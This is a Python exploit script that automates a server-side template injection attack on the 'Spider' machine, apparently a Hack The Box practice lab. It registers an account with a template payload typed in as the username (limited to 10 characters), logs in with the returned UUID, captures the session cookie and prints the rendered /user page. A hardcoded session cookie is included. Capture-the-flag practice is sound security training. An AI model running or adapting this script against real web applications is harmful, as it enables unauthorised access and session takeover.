# this exploit is used to automate the exploitation of the SSTI bug on htb spider machine.
# note: this ssti is limited to 10 chars only!

import requests
import re

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Cookie": "session=eyJjYXJ0X2l0ZW1zIjpbIjIiXX0.Z6LtKA.tG5cHDbWbo0O3jf489IELsNXDwk"
}

url = "http://spider.htb/register"
uname = input("username: ")
params = {"username": uname, "confirm_username": uname, "password": "coder", "confirm_password": "coder"}

res = requests.post(url, data=params, allow_redirects=False, verify=False, headers=headers)

# Extract UUID using regex
uuid_match = re.search(r'uuid=([\w-]+)', res.headers.get("Location", ""))

if uuid_match:
    uuid = uuid_match.group(1)
    out = requests.get("http://spider.htb/logout",headers=headers)

    # login part
    login = "http://spider.htb/login"
    parm2 = {"username":uuid,"password":"coder"}
    res = requests.post(login, data=parm2, allow_redirects=False, verify=False, headers=headers)
    cookies = res.cookies.get("session") 
    print(cookies)

    #ssti part
    ss = "http://spider.htb/user"
    headers["Cookie"]=f"session={cookies}"
    ssr = requests.get(ss,headers=headers)

    print(ssr.text)

else:
    print("UUID not found in response. (make sure that you enterd 10 chars as max for the username!)")
